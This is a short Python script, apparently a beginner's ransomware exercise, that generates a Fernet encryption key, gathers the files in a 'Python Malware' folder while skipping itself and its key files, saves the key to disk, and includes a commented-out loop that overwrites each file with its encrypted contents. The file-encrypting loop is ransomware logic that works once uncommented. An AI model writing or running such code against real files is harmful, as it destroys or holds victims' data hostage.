#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet #symmetric encryption method, cannot use w/o encryptopn key; 128-bit AES

# Create an Encryption key; initialize an empty array
encrypt_key = Fernet.generate_key()
all_files = []
files = os.listdir('.\Python Malware')

# Gather all files to encrypt; exclude Python script and encryption key files.
for file in files:
    if file == "PythonVirus.py" or file == "encry_key.key" or file == "decry_key.key":
        continue
    else:
        all_files.append(file)
    
print(all_files)
print(encrypt_key)

# Use Encryption key and write to a ".key" file
with open("encry_key.key", "wb") as keyfile:
    details = keyfile.write(encrypt_key)

# Use Encryption key and encrypt all selected files
# for selected_file in all_files:
#     with open(selected_file, "rb") as sfile:
#         fcontents = sfile.read()
#         encry_contents = Fernet(encrypt_key).encrypt(fcontents)
#     with open(selected_file, "wb") as sfile:
#         sfile.write(encry_contents)